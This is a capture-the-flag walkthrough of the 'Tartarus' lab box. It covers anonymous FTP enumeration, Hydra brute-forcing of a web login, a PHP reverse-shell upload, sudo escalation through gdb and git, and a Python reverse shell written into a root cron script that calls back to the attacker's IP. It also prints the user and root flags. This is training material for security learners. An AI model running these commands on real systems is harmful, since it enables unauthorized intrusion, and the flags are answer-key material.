> Astraeus | October 6, 2020

# Tartarus

>This is a beginner box based on simple enumeration of services and basic privilege escalation techniques. Based Jake
-----------------------------

# [Task 1]

> User and Root Flag

Anonymous FTP allowed:

```
cd ... 
cd ...

get yougotgoodeyes.txt
```
> /sUp3r-s3cr3t

```
Contains login page
```

Robots.txt
>User-Agent: *
>Disallow : /admin-dir
>I told d4rckh we should hide our things deep.

/admin-dir
>credentials.txt
>userid

```
hydra -L userid -P credentials.txt 10.10.157.219 http-form-post '/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect username!'
```

```
hydra -l enox -P credentials.txt 10.10.157.219 http-form-post '/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect password!'
```
> [80][http-post-form] host: 10.10.157.219   login: enox   password: P@ssword1234

Upload your php reverse shell, find in:
> /sUp3r-s3cr3t/images/uploads/

In shell:
```
sudo -l
```
>(thirtytwo) NOPASSWD: /var/www/gdb

[GTFOBins GDB](https://gtfobins.github.io/gtfobins/gdb/)

```
sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
```

As thirtytwo user:
```
sudo -l
```

>(d4rckh) NOPASSWD: /usr/bin/git

[GTFOBins Git](https://gtfobins.github.io/gtfobins/git/#sudo)

```
sudo -u d4rckh /usr/bin/git -p help config
!/bin/sh
```

```
cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/2 *   * * *   root    python /home/d4rckh/cleanup.py
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

```cleanup.py```
```-rwxrwxrwx 1 root   root    191 Oct  6 23:40 cleanup.py```


```python
cat cleanup.py

import os, socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("tun0 IP",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.system("/bin/sh -i")
```

## 1. User flag

```
0f7dbb2243e692e3ad222bc4eff8521f
```

## 2. Root flag

```
7e055812184a5fa5109d5db5c7eda7cd
```
